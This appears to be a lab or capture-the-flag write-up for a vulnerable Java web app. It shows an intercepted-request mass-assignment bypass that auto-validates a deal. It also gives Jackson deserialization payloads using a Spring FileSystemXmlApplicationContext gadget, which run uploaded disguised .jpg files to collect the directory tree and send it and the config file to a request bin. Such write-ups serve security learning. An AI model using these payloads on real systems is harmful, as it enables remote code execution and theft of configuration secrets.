# JAVALAB EXPLOITATION

## PART 1 (AUTO VALIDATE A DEAL)

### Step 1

Post a deal and intercept the request

```HTTP
------WebKitFormBoundaryGTkAu8msA7WAW6bE
Content-Disposition: form-data; name="infos"; filename="blob"
Content-Type: application/json

{"description":"aa","link":"aa"}
------WebKitFormBoundaryGTkAu8msA7WAW6bE--
```

### Step 2

Change the JSON and add the field "validated" with the name of the file in Base64

```HTTP
------WebKitFormBoundaryGTkAu8msA7WAW6bE
Content-Disposition: form-data; name="infos"; filename="blob"
Content-Type: application/json

{"description":"aa","link":"aa","validated":"fileNameInBase64"}
------WebKitFormBoundaryGTkAu8msA7WAW6bE--
```

### Step 3

Send the request, and ...... TDAM!


## PART 2 (Get application.properties or RCE)

### STEP 1

Create a new deal and upload "collect_arbo.jpg" to send the arbo in /tmp/test.txt
Use the Contact form, intercept the request en change details content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

by "["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/collect_arbo.jpg"]" to execute the content of collect-arbo

```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/collect_arbo.jpg"]}
```

### STEP 2

Create a new deal and upload **"send_arbo_to_request_bin.jpg"** to send the arbo to a request bin
Use the Contact form, intercept the request en change **details** content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

by "["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/send_arbo_to_request_bin.jpg"]" to execute the content of send_arbo_to_request_bin.jpg

```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/send_arbo_to_request_bin.jpg"]}
```

### STEP 3

Create a new deal and upload **"send_config_file_to_request_bin.jpg"** to send the arbo to a request bin
Use the Contact form, intercept the request en change **details** content

```JSON
{"email":"a","content":"a","details":{"@class":"com.laba4s.Private","phone":"a"}}
```

by "["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/send_config_file_to_request_bin.jpg"]" to execute the content of send_arbo_to_request_bin.jpg

```JSON
{"email":"a","content":"a","details":["org.springframework.context.support.FileSystemXmlApplicationContext","opt/app/tmp/send_config_file_to_request_bin.jpg"]}
```


